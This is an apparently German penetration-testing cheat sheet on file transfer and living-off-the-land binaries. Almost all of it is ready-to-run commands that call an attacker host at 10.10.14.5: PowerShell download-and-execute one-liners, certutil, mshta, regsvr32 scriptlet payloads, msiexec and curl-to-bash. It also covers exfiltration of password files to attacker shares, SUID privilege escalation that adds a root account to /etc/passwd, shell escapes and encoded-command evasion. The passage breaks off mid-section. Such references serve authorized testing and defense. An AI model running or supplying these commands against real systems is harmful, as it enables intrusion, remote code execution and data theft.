# File Transfer & LOLBins - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

---

## Inhaltsverzeichnis
1. [Windows File Download](#windows-file-download)
2. [Windows File Upload](#windows-file-upload)
3. [Windows LOLBins](#windows-lolbins)
4. [Linux File Download](#linux-file-download)
5. [Linux File Upload](#linux-file-upload)
6. [Linux LOLBins (GTFOBins)](#linux-lolbins-gtfobins)
7. [PowerShell Transfer](#powershell-transfer)
8. [SMB Transfer](#smb-transfer)
9. [FTP Transfer](#ftp-transfer)
10. [HTTP/HTTPS Server](#httphttps-server)
11. [Netcat Transfer](#netcat-transfer)
12. [Base64 Encoding](#base64-encoding)
13. [Python Transfer](#python-transfer)
14. [PHP Transfer](#php-transfer)
15. [SSH/SCP Transfer](#sshscp-transfer)
16. [RDP Transfer](#rdp-transfer)
17. [DNS Exfiltration](#dns-exfiltration)
18. [ICMP Exfiltration](#icmp-exfiltration)
19. [Alternative Transfer Methods](#alternative-transfer-methods)
20. [Data Exfiltration Techniques](#data-exfiltration-techniques)
21. [Evasion Techniques](#evasion-techniques)
22. [Large File Transfer](#large-file-transfer)

---

## Windows File Download

### 1. PowerShell Download Methods

#### DownloadFile (klassisch)
```powershell
# Basic Download
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')"

# Mit Execution Policy Bypass
powershell -ep bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')"

# Hidden Window
powershell -w hidden -ep bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')"

# No Profile
powershell -nop -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')"
```

#### DownloadString (Fileless Execution)
```powershell
# Download und Execute (in Memory)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

# Mit Alias
powershell -c "IEX (IWR -UseBasicParsing http://10.10.14.5/script.ps1)"

# Kurzform
powershell "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
```

#### Invoke-WebRequest (PowerShell 3.0+)
```powershell
# Download
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe"

# Alias iwr
powershell -c "iwr -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe"

# UseBasicParsing (ohne IE)
powershell -c "iwr -UseBasicParsing http://10.10.14.5/file.exe -OutFile C:\temp\file.exe"

# Mit Credentials
$cred = Get-Credential
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -Credential $cred -OutFile file.exe
```

#### Invoke-RestMethod
```powershell
# Download
Invoke-RestMethod -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe

# Alias irm
irm http://10.10.14.5/file.exe -OutFile C:\temp\file.exe
```

#### Start-BitsTransfer (BITS)
```powershell
# Background Intelligent Transfer Service
Import-Module BitsTransfer
Start-BitsTransfer -Source http://10.10.14.5/file.exe -Destination C:\temp\file.exe

# Mit Priority
Start-BitsTransfer -Source http://10.10.14.5/file.exe -Destination C:\temp\file.exe -Priority High

# Asynchron
Start-BitsTransfer -Source http://10.10.14.5/file.exe -Destination C:\temp\file.exe -Asynchronous
```

### 2. Certutil (Native Windows Binary)
```cmd
# HTTP Download
certutil -urlcache -f http://10.10.14.5/file.exe file.exe

# HTTPS
certutil -urlcache -f https://10.10.14.5/file.exe file.exe

# Split (mehrere URLs)
certutil -urlcache -split -f http://10.10.14.5/file.exe file.exe

# Cache löschen (Cleanup)
certutil -urlcache -f http://10.10.14.5/file.exe delete

# Base64 Decode (siehe Base64 Section)
certutil -decode encoded.txt decoded.exe
```
**Vorteile**: Native, signiert, oft nicht geblockt
**Nachteile**: Wird geloggt, bekannt bei EDR

### 3. BITSAdmin (Background Intelligent Transfer)
```cmd
# Basic Download
bitsadmin /transfer myDownload /download /priority high http://10.10.14.5/file.exe C:\temp\file.exe

# Mit Job Name
bitsadmin /create myJob
bitsadmin /addfile myJob http://10.10.14.5/file.exe C:\temp\file.exe
bitsadmin /resume myJob
bitsadmin /complete myJob

# Mehrere Dateien
bitsadmin /create multiJob
bitsadmin /addfile multiJob http://10.10.14.5/file1.exe C:\temp\file1.exe
bitsadmin /addfile multiJob http://10.10.14.5/file2.exe C:\temp\file2.exe
bitsadmin /resume multiJob
bitsadmin /complete multiJob
```
**Vorteile**: Resumable, native
**Nachteile**: Langsamer, geloggt

### 4. mshta (HTML Application)
```cmd
# Download und Execute HTA
mshta http://10.10.14.5/payload.hta

# JavaScript Download
mshta "javascript:a=GetObject('script:http://10.10.14.5/payload.sct').Exec();close()"

# VBScript Download
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"":close")
```

### 5. rundll32
```cmd
# Download via JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')")

# Via URL
rundll32.exe url.dll,OpenURL http://10.10.14.5/file.exe

# Via FileProtocolHandler
rundll32.exe url.dll,FileProtocolHandler http://10.10.14.5/file.exe
```

### 6. regsvr32 (Squiblydoo)
```cmd
# SCT File (Scriptlet)
regsvr32 /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll

# Beispiel payload.sct:
<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{A1112221-0000-0000-3000-000DA00DABFC}">
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')");
]]>
</script>
</registration>
</scriptlet>
```

### 7. curl (Windows 10 1803+)
```cmd
# Basic Download
curl http://10.10.14.5/file.exe -o file.exe

# Mit Output
curl http://10.10.14.5/file.exe --output file.exe

# Follow Redirects
curl -L http://10.10.14.5/file.exe -o file.exe

# HTTPS (ignore cert)
curl -k https://10.10.14.5/file.exe -o file.exe

# Mit Credentials
curl -u username:password http://10.10.14.5/file.exe -o file.exe

# POST data
curl -X POST -d "data=value" http://10.10.14.5/upload
```

### 8. wget (falls installiert)
```cmd
# Basic Download
wget http://10.10.14.5/file.exe -O file.exe

# Recursive
wget -r http://10.10.14.5/

# No check certificate
wget --no-check-certificate https://10.10.14.5/file.exe
```

### 9. wscript / cscript (VBScript/JScript)
```vbscript
' download.vbs
Dim objXMLHTTP, objADOStream
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", "http://10.10.14.5/file.exe", False
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile "C:\temp\file.exe", 2
    objADOStream.Close
    Set objADOStream = Nothing
End If
Set objXMLHTTP = Nothing

' Execute:
cscript download.vbs
```

### 10. Excel / Word Macro
```vba
' VBA Macro Download
Sub Download()
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("WinHttp.WinHttpRequest.5.1")
    WinHttpReq.Open "GET", "http://10.10.14.5/file.exe", False
    WinHttpReq.Send

    If WinHttpReq.Status = 200 Then
        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile "C:\temp\file.exe", 2
        oStream.Close
    End If
End Sub
```

### 11. desktopimgdownldr (Windows 10)
```cmd
# Download via desktopimgdownldr.exe
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://10.10.14.5/file.exe /eventName:desktopimgdownldr

# File wird gespeichert als:
C:\Windows\Temp\Personalization\LockScreenImage\LockScreenImage_*
```

### 12. esentutl (Extensible Storage Engine)
```cmd
# Download
esentutl.exe /y \\10.10.14.5\share\file.exe /d C:\temp\file.exe /o

# Copy
esentutl.exe /y C:\source\file.exe /d C:\temp\file.exe /o
```

### 13. expand (CAB Extraction)
```cmd
# Benötigt CAB-File auf Server
# file.cab mit file.exe darin
expand \\10.10.14.5\share\file.cab C:\temp\file.exe

# Von HTTP (mit UNC Path Mapping) - komplex
```

### 14. extrac32 (CAB Extraction)
```cmd
# Extract from CAB
extrac32 /Y /C \\10.10.14.5\share\file.cab C:\temp\

# Alternative
extrac32.exe \\10.10.14.5\share\archive.cab /Y
```

---

## Windows File Upload

### 15. PowerShell Upload

#### Invoke-WebRequest POST
```powershell
# File Upload via POST
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -InFile C:\file.txt"

# Mit Form
powershell -c "$file = Get-Content C:\file.txt; Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -Body $file"

# Multipart Form
$filePath = "C:\file.exe"
$url = "http://10.10.14.5/upload"
$fieldName = "file"
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{"Content-Type"="multipart/form-data; boundary=$boundary"}
$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"$fieldName`"; filename=`"file.exe`"",
    "Content-Type: application/octet-stream",
    "",
    [System.IO.File]::ReadAllText($filePath),
    "--$boundary--"
)
$body = $bodyLines -join "`r`n"
Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
```

#### WebClient Upload
```powershell
# Upload File
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.14.5/upload', 'C:\file.txt')"

# Upload String/Data
powershell -c "$data = Get-Content C:\file.txt; (New-Object System.Net.WebClient).UploadString('http://10.10.14.5/upload', $data)"
```

### 16. curl Upload
```cmd
# Upload via POST
curl -X POST -F "file=@C:\file.txt" http://10.10.14.5/upload

# Upload via PUT
curl -T C:\file.txt http://10.10.14.5/upload

# FTP Upload
curl -T file.txt ftp://10.10.14.5/ --user username:password
```

### 17. BITSAdmin Upload
```cmd
# Upload via BITS
bitsadmin /transfer upload /upload http://10.10.14.5/upload C:\file.txt
```

---

## Windows LOLBins

### 18. File Operations LOLBins

#### xcopy
```cmd
# Copy Files
xcopy C:\source\file.exe C:\dest\

# Copy from Share
xcopy \\10.10.14.5\share\file.exe C:\temp\

# Recursive
xcopy C:\source C:\dest /E /I /Y
```

#### robocopy
```cmd
# Robust Copy
robocopy C:\source C:\dest file.exe

# From Share
robocopy \\10.10.14.5\share C:\temp file.exe

# Mirror (sync)
robocopy C:\source C:\dest /MIR
```

#### copy
```cmd
# Basic Copy
copy \\10.10.14.5\share\file.exe C:\temp\

# Multiple files
copy \\10.10.14.5\share\*.exe C:\temp\

# Binary mode
copy /B file1.exe+file2.dat output.exe
```

#### move
```cmd
# Move File
move C:\source\file.exe C:\dest\

# From Share
move \\10.10.14.5\share\file.exe C:\temp\
```

#### replace
```cmd
# Replace files
replace C:\source\file.exe C:\dest\

# From Share
replace \\10.10.14.5\share\file.exe C:\temp\
```

### 19. Execution LOLBins

#### forfiles
```cmd
# Execute command for file
forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd.exe /c whoami"

# Download + Execute
forfiles /p C:\Windows\System32 /m cmd.exe /c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
```

#### wmic
```cmd
# Execute Process
wmic process call create "cmd.exe /c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

# Remote Execution
wmic /node:192.168.1.100 process call create "cmd.exe"

# Download via XSL
wmic os get /format:"http://10.10.14.5/payload.xsl"
```

#### msiexec
```cmd
# Install MSI from URL
msiexec /i http://10.10.14.5/payload.msi /quiet

# Uninstall (cleanup)
msiexec /uninstall {GUID} /quiet

# Remote MSI
msiexec /i \\10.10.14.5\share\payload.msi /quiet
```

#### mshta (siehe #4)
```cmd
mshta http://10.10.14.5/payload.hta
```

#### control
```cmd
# Control Panel items können Code ausführen
control.exe http://10.10.14.5/payload.cpl
```

### 20. Encoding/Decoding LOLBins

#### certutil (Encoding)
```cmd
# Base64 Encode
certutil -encode input.exe encoded.txt

# Base64 Decode
certutil -decode encoded.txt output.exe

# Hex Dump
certutil -encodehex input.exe output.hex

# Hex to Binary
certutil -decodehex output.hex decoded.exe
```

#### makecab / expand
```cmd
# Compress
makecab file.exe file.cab

# Extract
expand file.cab -F:* C:\dest\

# Extract specific
expand file.cab -F:file.exe C:\dest\
```

### 21. Data Exfiltration LOLBins

#### findstr
```cmd
# Search for patterns (can leak data via DNS/HTTP in complex scenarios)
findstr /S /I password *.txt

# Output to remote
findstr /S /I password *.txt > \\10.10.14.5\share\output.txt
```

#### type / more
```cmd
# Display file content
type C:\file.txt

# Over network
type \\10.10.14.5\share\file.txt

# Redirect to remote
type C:\passwords.txt > \\10.10.14.5\share\exfil.txt
```

---

## Linux File Download

### 22. wget
```bash
# Basic Download
wget http://10.10.14.5/file.sh

# Output filename
wget http://10.10.14.5/file.sh -O payload.sh

# Quiet mode
wget -q http://10.10.14.5/file.sh -O payload.sh

# Background
wget -b http://10.10.14.5/file.sh

# Recursive
wget -r http://10.10.14.5/

# No check certificate
wget --no-check-certificate https://10.10.14.5/file.sh

# With credentials
wget --user=username --password=password http://10.10.14.5/file.sh

# Spider (check without download)
wget --spider http://10.10.14.5/file.sh

# Continue partial download
wget -c http://10.10.14.5/largefile.zip

# Rate limit
wget --limit-rate=200k http://10.10.14.5/file.sh
```

### 23. curl
```bash
# Basic Download
curl http://10.10.14.5/file.sh -o file.sh

# Output with original name
curl -O http://10.10.14.5/file.sh

# Silent
curl -s http://10.10.14.5/file.sh -o file.sh

# Follow redirects
curl -L http://10.10.14.5/file.sh -o file.sh

# No certificate check
curl -k https://10.10.14.5/file.sh -o file.sh

# With credentials
curl -u username:password http://10.10.14.5/file.sh -o file.sh

# Download and execute (pipe to bash)
curl http://10.10.14.5/script.sh | bash

# Download and execute (pipe to sh)
curl -s http://10.10.14.5/script.sh | sh

# Multiple files
curl -O http://10.10.14.5/file1.sh -O http://10.10.14.5/file2.sh

# Resume download
curl -C - http://10.10.14.5/largefile.zip -o largefile.zip
```

### 24. lynx
```bash
# Text browser download
lynx -source http://10.10.14.5/file.sh > file.sh

# Dump
lynx -dump http://10.10.14.5/file.txt
```

### 25. fetch (BSD/macOS)
```bash
# Download
fetch http://10.10.14.5/file.sh

# Output
fetch -o payload.sh http://10.10.14.5/file.sh
```

### 26. axel
```bash
# Multi-threaded download
axel http://10.10.14.5/file.sh

# Number of connections
axel -n 10 http://10.10.14.5/largefile.zip
```

### 27. aria2
```bash
# Download
aria2c http://10.10.14.5/file.sh

# Multiple connections
aria2c -x 10 http://10.10.14.5/largefile.zip
```

### 28. Python
```bash
# Python 2
python -c 'import urllib; urllib.urlretrieve("http://10.10.14.5/file.sh", "file.sh")'

# Python 3
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5/file.sh", "file.sh")'

# Python requests (if available)
python3 -c 'import requests; r = requests.get("http://10.10.14.5/file.sh"); open("file.sh", "wb").write(r.content)'
```

### 29. Perl
```bash
# Download with Perl
perl -e 'use LWP::Simple; getstore("http://10.10.14.5/file.sh", "file.sh");'

# Alternative
perl -MLWP::Simple -e 'getstore("http://10.10.14.5/file.sh", "file.sh")'
```

### 30. Ruby
```bash
# Download with Ruby
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("http://10.10.14.5/file.sh")))'

# Alternative
ruby -e 'require "open-uri"; download = open("http://10.10.14.5/file.sh"); IO.copy_stream(download, "file.sh")'
```

### 31. PHP
```bash
# Download with PHP
php -r '$file = file_get_contents("http://10.10.14.5/file.sh"); file_put_contents("file.sh", $file);'

# Alternative
php -r 'copy("http://10.10.14.5/file.sh", "file.sh");'
```

### 32. nc / ncat / netcat
```bash
# Netcat receive
nc -lvnp 4444 > file.sh

# Sender (Angreifer):
nc -w 3 <target_ip> 4444 < file.sh

# Alternative (target listen, attacker send):
# Target:
nc -lvnp 4444 > received_file.sh
# Attacker:
nc <target_ip> 4444 < file.sh
```

---

## Linux File Upload

### 33. curl Upload
```bash
# POST file
curl -X POST -F "file=@/path/to/file.txt" http://10.10.14.5/upload

# PUT file
curl -T /path/to/file.txt http://10.10.14.5/upload

# FTP Upload
curl -T file.txt ftp://10.10.14.5/ --user username:password

# With data
curl -X POST -d @file.txt http://10.10.14.5/upload
```

### 34. wget Upload (limited)
```bash
# POST file
wget --post-file=/path/to/file.txt http://10.10.14.5/upload

# POST data
wget --post-data="data=$(cat file.txt)" http://10.10.14.5/upload
```

### 35. Python Upload
```python
# Python 2
python -c 'import requests; requests.post("http://10.10.14.5/upload", files={"file": open("/path/to/file.txt", "rb")})'

# Python 3
python3 -c 'import requests; requests.post("http://10.10.14.5/upload", files={"file": open("/path/to/file.txt", "rb")})'
```

### 36. nc Upload
```bash
# Target (send file):
nc <attacker_ip> 4444 < /path/to/file.txt

# Attacker (receive):
nc -lvnp 4444 > received_file.txt
```

### 37. scp (wenn SSH verfügbar)
```bash
# Upload to remote
scp /local/file.txt user@10.10.14.5:/remote/path/

# Upload with key
scp -i key.pem /local/file.txt user@10.10.14.5:/remote/path/

# Recursive
scp -r /local/dir user@10.10.14.5:/remote/path/
```

---

## Linux LOLBins (GTFOBins)

### 38. File Read LOLBins

#### cat
```bash
# Read file
cat /etc/passwd

# Read as root (if SUID)
./cat /etc/shadow

# Concatenate
cat file1.txt file2.txt > combined.txt
```

#### less / more
```bash
# Read file
less /etc/passwd
more /etc/passwd

# If SUID/sudo
sudo less /etc/shadow
# Then: !/bin/sh (escape to shell)
```

#### head / tail
```bash
# Read first lines
head /etc/passwd
head -n 20 /etc/passwd

# Read last lines
tail /etc/passwd
tail -n 20 /etc/passwd

# Follow (log monitoring)
tail -f /var/log/syslog
```

#### sort / uniq
```bash
# Can read files
sort /etc/passwd
uniq /etc/passwd
```

#### diff
```bash
# Compare files
diff file1.txt file2.txt

# Can leak file content
diff /etc/passwd /dev/null
```

#### grep
```bash
# Search in files
grep password /etc/config

# Recursive
grep -r "password" /etc/

# If SUID
./grep "" /etc/shadow
```

### 39. File Write LOLBins

#### tee
```bash
# Write to file (with append)
echo "data" | tee file.txt

# Append
echo "data" | tee -a file.txt

# Multiple files
echo "data" | tee file1.txt file2.txt

# SUID exploitation
echo "user::0:0:root:/root:/bin/bash" | tee -a /etc/passwd
```

#### dd
```bash
# Write to file
echo "data" | dd of=file.txt

# Copy file
dd if=/source/file of=/dest/file

# Disk operations (dangerous!)
dd if=/dev/zero of=/dev/sda  # DON'T DO THIS!

# SUID exploitation
echo "data" | dd of=/etc/file
```

#### cp / mv (siehe #18)
```bash
# Copy
cp source.txt dest.txt

# If writable destination with SUID
cp /etc/passwd /tmp/passwd.bak
echo "root2:..." >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd  # if cp is SUID
```

### 40. Command Execution LOLBins

#### bash / sh
```bash
# Direct execution
bash -c 'command'
sh -c 'command'

# SUID bash (rare)
bash -p  # Preserve privileges
```

#### find
```bash
# Execute commands
find /etc/passwd -exec whoami \;
find /etc/passwd -exec /bin/bash -p \;

# SUID find
./find . -exec /bin/sh -p \; -quit
```

#### vim / vi
```bash
# Escape to shell
vim
:!/bin/bash
:set shell=/bin/bash
:shell

# SUID vim
vim -c ':!/bin/sh'
```

#### awk
```bash
# Execute commands
awk 'BEGIN {system("/bin/bash")}'

# SUID awk
./awk 'BEGIN {system("/bin/bash -p")}'
```

#### python / python3
```bash
# Execute
python -c 'import os; os.system("/bin/bash")'

# SUID python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### perl
```bash
# Execute
perl -e 'exec "/bin/bash";'

# SUID perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### ruby
```bash
# Execute
ruby -e 'exec "/bin/bash"'

# SUID ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

#### tar
```bash
# Execute on extraction
tar -cf archive.tar file.txt --checkpoint=1 --checkpoint-action=exec=/bin/bash

# SUID tar
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### zip / unzip
```bash
# Execute
zip file.zip file.txt -T -TT 'sh #'

# unzip
unzip -p file.zip | /bin/bash
```

#### git
```bash
# Execute via pager
git help config
# Then: !/bin/bash

# SUID git (if exists)
sudo git -p help config
!/bin/bash
```

#### man
```bash
# Execute via pager
man man
# Then: !/bin/bash

# SUID/sudo man
sudo man man
!/bin/bash
```

---

## PowerShell Transfer

### 41. PowerShell One-Liners

#### Download File
```powershell
# WebClient DownloadFile
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','file.exe')"

# Invoke-WebRequest
powershell -c "Invoke-WebRequest http://10.10.14.5/file.exe -OutFile file.exe"

# IWR Alias
powershell -c "iwr http://10.10.14.5/file.exe -OutFile file.exe"
```

#### Download and Execute (Fileless)
```powershell
# IEX + DownloadString
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

# IEX + IWR
powershell -c "IEX(IWR -UseBasicParsing http://10.10.14.5/script.ps1)"

# Encoded
$command = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encodedCommand
```

#### Upload File
```powershell
# POST File
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.14.5/upload', 'file.txt')"

# UploadString
powershell -c "(New-Object System.Net.WebClient).UploadString('http://10.10.14.5/upload', (Get-Content file.txt))"
```

### 42. PowerShell Advanced Download
```powershell
# Disable Certificate Validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("https://10.10.14.5/file.exe", "file.exe")

# With Proxy
$webClient = New-Object System.Net.WebClient
$webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$webClient.DownloadFile("http://10.10.14.5/file.exe", "file.exe")

# With User-Agent
$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("User-Agent", "Mozilla/5.0")
$webClient.DownloadFile("http://10.10.14.5/file.exe", "file.exe")
```

---

## SMB Transfer

### 43. SMB Server Setup (Attacker)

#### Impacket SMB Server (Linux)
```bash
# Basic SMB Share
impacket-smbserver share /root/share

# With SMB2 support
impacket-smbserver share /root/share -smb2support

# With credentials
impacket-smbserver share /root/share -smb2support -username user -password pass

# Specific IP
impacket-smbserver share /root/share -smb2support -ip 10.10.14.5
```

#### Samba (Linux)
```bash
# /etc/samba/smb.conf
[share]
path = /root/share
browseable = yes
read only = no
guest ok = yes

# Restart
systemctl restart smbd

# Test
smbclient -L //localhost
```

### 44. SMB Client (Windows)

#### Copy from SMB
```cmd
# List share
net view \\10.10.14.5

# Copy file
copy \\10.10.14.5\share\file.exe C:\temp\

# Xcopy
xcopy \\10.10.14.5\share\file.exe C:\temp\

# Robocopy
robocopy \\10.10.14.5\share C:\temp file.exe

# Direct execution
\\10.10.14.5\share\file.exe
```

#### Copy to SMB (Upload)
```cmd
# Copy to share
copy C:\file.txt \\10.10.14.5\share\

# Xcopy
xcopy C:\file.txt \\10.10.14.5\share\
```

#### Map Drive
```cmd
# Map network drive
net use Z: \\10.10.14.5\share

# With credentials
net use Z: \\10.10.14.5\share /user:username password

# Access
Z:
dir

# Disconnect
net use Z: /delete
```

### 45. SMB Client (Linux)

#### smbclient
```bash
# List shares
smbclient -L //10.10.14.5

# Connect to share
smbclient //10.10.14.5/share

# Download file
smbclient //10.10.14.5/share -c "get file.txt"

# Upload file
smbclient //10.10.14.5/share -c "put file.txt"

# With credentials
smbclient //10.10.14.5/share -U username%password
```

#### smbget
```bash
# Download file
smbget smb://10.10.14.5/share/file.txt

# Recursive
smbget -R smb://10.10.14.5/share/

# With credentials
smbget smb://10.10.14.5/share/file.txt -U username%password
```

#### mount
```bash
# Mount SMB share
mount -t cifs //10.10.14.5/share /mnt/share

# With credentials
mount -t cifs //10.10.14.5/share /mnt/share -o username=user,password=pass

# Unmount
umount /mnt/share
```

---

## FTP Transfer

### 46. FTP Server Setup

#### Python pyftpdlib
```bash
# Install
pip3 install pyftpdlib

# Anonymous FTP
python3 -m pyftpdlib -p 21 -w

# With credentials
python3 -m pyftpdlib -p 21 -u username -P password -w

# Specific directory
python3 -m pyftpdlib -p 21 -d /root/share -w
```

#### vsftpd (Linux)
```bash
# Install
apt install vsftpd

# Config: /etc/vsftpd.conf
anonymous_enable=YES
write_enable=YES

# Restart
systemctl restart vsftpd
```

### 47. FTP Client (Windows)

#### Built-in FTP
```cmd
# Interactive FTP
ftp 10.10.14.5

# Login
anonymous / anonymous

# Download
get file.exe

# Upload
put file.txt

# Binary mode (für exe/dll)
binary
get file.exe

# Quit
bye
```

#### FTP Script (Non-Interactive)
```cmd
# ftp_commands.txt:
open 10.10.14.5
anonymous
anonymous
binary
get file.exe
bye

# Execute:
ftp -s:ftp_commands.txt
```

#### PowerShell FTP
```powershell
# Download
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous")
$client.DownloadFile("ftp://10.10.14.5/file.exe", "file.exe")

# Upload
$client.UploadFile("ftp://10.10.14.5/upload/file.txt", "file.txt")
```

### 48. FTP Client (Linux)
```bash
# Interactive
ftp 10.10.14.5

# Download
wget ftp://10.10.14.5/file.txt

# With credentials
wget ftp://username:password@10.10.14.5/file.txt

# curl FTP
curl ftp://10.10.14.5/file.txt -o file.txt
curl -u username:password ftp://10.10.14.5/file.txt -o file.txt

# Upload
curl -T file.txt ftp://10.10.14.5/ --user username:password
```

---

## HTTP/HTTPS Server

### 49. Python HTTP Server

#### Python 3
```bash
# Simple HTTP Server
python3 -m http.server 80

# Different port
python3 -m http.server 8000

# Specific directory
cd /root/share
python3 -m http.server 80

# Bind to specific IP
python3 -m http.server 80 --bind 10.10.14.5
```

#### Python 2
```bash
# SimpleHTTPServer
python -m SimpleHTTPServer 80

# Different port
python -m SimpleHTTPServer 8000
```

#### Python HTTPS Server
```python
# https_server.py
import http.server
import ssl

httpd = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./cert.pem', server_side=True)
httpd.serve_forever()

# Generate cert:
openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes

# Run:
python3 https_server.py
```

### 50. PHP HTTP Server
```bash
# Built-in PHP Server
php -S 0.0.0.0:80

# Specific directory
php -S 0.0.0.0:80 -t /root/share
```

### 51. Ruby HTTP Server
```bash
# WEBrick
ruby -run -e httpd . -p 80

# Specific directory
ruby -run -e httpd /root/share -p 80
```

### 52. Apache / Nginx
```bash
# Apache
cp files /var/www/html/
systemctl start apache2

# Nginx
cp files /usr/share/nginx/html/
systemctl start nginx
```

### 53. Upload Server (Python)

#### uploadserver (pip)
```bash
# Install
pip3 install uploadserver

# Run
python3 -m uploadserver 80

# With authentication
python3 -m uploadserver 80 --server-certificate cert.pem --username admin --password pass
```

#### Custom Python Upload Server
```python
# upload_server.py
import http.server
import socketserver

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open("uploaded_file", "wb") as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"File uploaded successfully")

PORT = 80
Handler = UploadHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()

# Run:
python3 upload_server.py
```

---

## Netcat Transfer

### 54. Netcat File Transfer

#### Send File (Target -> Attacker)
```bash
# Attacker (Receiver):
nc -lvnp 4444 > received_file.exe

# Target (Sender):
nc <attacker_ip> 4444 < file.exe

# Alternative: with progress (using pv)
nc <attacker_ip> 4444 < file.exe | pv
```

#### Receive File (Attacker -> Target)
```bash
# Target (Receiver):
nc -lvnp 4444 > received_file.exe

# Attacker (Sender):
nc <target_ip> 4444 < file.exe
```

#### Netcat Windows
```cmd
# Windows netcat (if installed)
nc.exe -lvnp 4444 > file.exe

# Send
nc.exe <attacker_ip> 4444 < file.exe
```

### 55. Netcat with Compression
```bash
# Sender (compressed):
tar czf - /path/to/files | nc <receiver_ip> 4444

# Receiver:
nc -lvnp 4444 | tar xzf -
```

### 56. Ncat (Nmap Netcat)
```bash
# SSL/TLS Transfer
# Receiver:
ncat -lvnp 4444 --ssl > file.exe

# Sender:
ncat <receiver_ip> 4444 --ssl < file.exe
```

---

## Base64 Encoding

### 57. Base64 Encode/Decode (Windows)

#### PowerShell Base64
```powershell
# Encode file to Base64
$file = [System.IO.File]::ReadAllBytes("C:\file.exe")
$base64 = [Convert]::ToBase64String($file)
Set-Content -Path "encoded.txt" -Value $base64

# Decode Base64 to file
$base64 = Get-Content -Path "encoded.txt"
$bytes = [Convert]::FromBase64String($base64)
[System.IO.File]::WriteAllBytes("C:\decoded.exe", $bytes)

# One-liner encode
powershell "[Convert]::ToBase64String([IO.File]::ReadAllBytes('file.exe')) | Out-File encoded.txt"

# One-liner decode
powershell "[IO.File]::WriteAllBytes('decoded.exe', [Convert]::FromBase64String((Get-Content encoded.txt)))"
```

#### Certutil Base64
```cmd
# Encode
certutil -encode file.exe encoded.txt

# Decode
